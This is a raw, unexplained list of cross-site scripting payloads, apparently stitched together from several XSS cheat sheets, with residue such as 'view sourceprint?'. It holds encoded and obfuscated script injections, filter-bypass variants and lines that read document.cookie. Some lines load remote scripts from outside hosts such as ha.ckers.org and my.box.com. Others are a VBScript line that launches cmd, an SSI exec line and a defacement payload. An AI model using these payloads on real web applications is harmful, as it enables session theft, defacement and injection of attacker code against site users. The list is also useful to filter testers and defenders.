<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
Dim a : Dim b : a = chr(87) + chr(83) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(46) + chr(83) + chr(104) + chr(101) + chr(108) + chr(108) : b = chr(99) + chr(109) + chr(100) : CreateObject(a).Run b
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"/-alert(1)//><img src=1 onerror=alert(1)>'<SCRIPT>alert("Test");iMg sRc=1.gif onerror = alert("1")><img src=foo.png onerror=alert(/xssed/) />
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
%27%22%3E%3C%2F%74%69%74%6C%65%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
%3C%69%6D%67%20%22%22%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
\u0065\u003d\u0030\u005b'\x65\x76\141\154'\u005d\u0028'\142\53\172\53\66\61\53\142\53\172\53\66\53\143\53\142\53\172\53\66\65\53\142\53\172\53\67\62\53\142\53\172\53\67\64\53\142\53\172\53\62\70\53\142\53\172\53\63\61\53\142\53\172\53\62\71'\u0029
%27%22%3E%3C%2F%74%69%74%6C%65%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%20%62%79%20%5C%6E%31%27%29%3B%22%3E%3C%2F%69%66%72%61%6D%65%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<a x="javasc&#x0Aript:alert(1)" style="\000062\00065\68\0\00  \&#xA0\000061 vio\r:url\28#default#time2);\-\ \ \00006D\0006f\7A\2d \62	\000069 \06E din\g:url(test.xbl#xss);\-\00006F\0002d\6C \69 \6e	\00006B:attr(x);\-\00006F\0002d\6C \69 \6e	\00006B-s\ource:current" end=0 onend=alert(1)>XXX
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg>
50) <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><TABLE><TD BACKGROUND="javascript:alert('XSS')"><TABLE BACKGROUND="javascript:alert('XSS')"><FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:alert(1)"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:alert(1)"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/> </svg>
18) <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>​
<input type="button" value="CHange Color!" onClick="document.bgColor='#cc2801'">



<input type="button" value="Get Cookie!" onClick=alert(document.cookie);>

<input type="button" value="Alert!" onClick=alert("XSS Hole");>

<INPUT type="button" value="Get Cookie String" onClick='alert(unescape(document.cookie))'>

<img src ="http://www.Yahoo.com/public/images/pic.jpg">

"><script>window.location="http://www.Yahoo.com"</script>


<image src="http://www.site.com/images/PIC.jpg" onLoad="showLoaded( );"><body onLoad="showLoaded(

);">



"><BODY onLoad="document.write('<center><h1>HACKED</h1><plaintext>OWNED!');">


<BODY onUnload=<script>"alert('bye now!')"</script>>


<BODY onLoad="alert("HACKED"); alert(document.cookie)">



"><script src=http://www.site.com/XSS.js></script>


"><plaintext>


<embed src="http://www.usher-lyrics.info/swf/usher-swf-i-need-a-girl.swf" autostart="true"

loop="true" hidden="true"></embed>


<script>for (;;);</script>


<iframe src="file://þ:/Test.txt">


>"<iframe src=http://www.Google.com width=815 height=505></script>


"><plaintext>

"><script>alert('Hacked');</script>

"><script>alert(document.cookie);</script>

<script>alert(String.fromCharCode(88,83,83))</script>

<script src=http://www.Site.com/XSS.js></script>

>"<iframe src=http://www.Site.com width=815 height=505></script>


<INPUT TYPE="TEXT" VALUE=""><plaintext>">
<img src=/ onerror=alert(0);>
''%22%3EXXX%3Cscript%3Ealert(1)%3C/script%3E3
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
view sourceprint?
1.'';!--"<XSS>=&amp;amp;{()}
view sourceprint?
1.<IMG SRC="javascript:alert('XSS');">
view sourceprint?
1.<IMG SRC=javascript:alert('XSS')>
view sourceprint?
1.<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
view sourceprint?
1.<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
view sourceprint?
1.<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
view sourceprint?
1.<IMG SRC="jav    ascript:alert('XSS');">
view sourceprint?
1.perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
view sourceprint?
1.<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
view sourceprint?
1."><iframe src=google.de></iframe>
view sourceprint?
1.<BODY BACKGROUND="javascript:alert('XSS')">
view sourceprint?
1.<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
view sourceprint?
1.<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
view sourceprint?
1.“><script >alert(document.cookie)</script>
view sourceprint?
1.%253cscript%253ealert(document.cookie)%253c/script%253e
view sourceprint?
1.“><s”%2b”cript>alert(document.cookie)</script>
view sourceprint?
1.%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
view sourceprint?
1.<img src=asdf onerror=alert(document.cookie)><script>alert(123)</script>
<script>alert("hellox worldss");</script>
javascript:alert("hellox worldss")
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
“><script >alert(document.cookie)</script>


Bypass filter when it strips <script> tags:


%253cscript%253ealert(document.cookie)%253c/script%253e

“><s”%2b”cript>alert(document.cookie)</script>

“><ScRiPt>alert(document.cookie)</script>

“><<script>alert(document.cookie);//<</script>

foo%00<script>alert(document.cookie)</script>

<scr<script>ipt>alert(document.cookie)</scr</script>ipt>

%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E

 <IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="   javascript:alert('XSS');">
<iframe src=http://ha.ckers.org/scriptlet.html <
<SCRIPT SRC=//ha.ckers.org/.j>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS')">
<BR SIZE="&{alert('XSS')}">Code 39 (always URL encoded, or double encoded, otherwise it can't make the characters) 
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">

‘; alert(document.cookie); var foo=’

foo\’; alert(document.cookie);//’;

</script><script >alert(document.cookie)</script>


<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert("XSS");</script>&search=1
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
<h1><font color=blue>hellox worldss</h1>
<BODY ONLOAD=alert('hellox worldss')>
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<div style="font-family:'foo&#10;;color:red;';">LOL
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
žscriptualert(EXSSE)ž/scriptu
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;!&#91;endif&#93;--&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
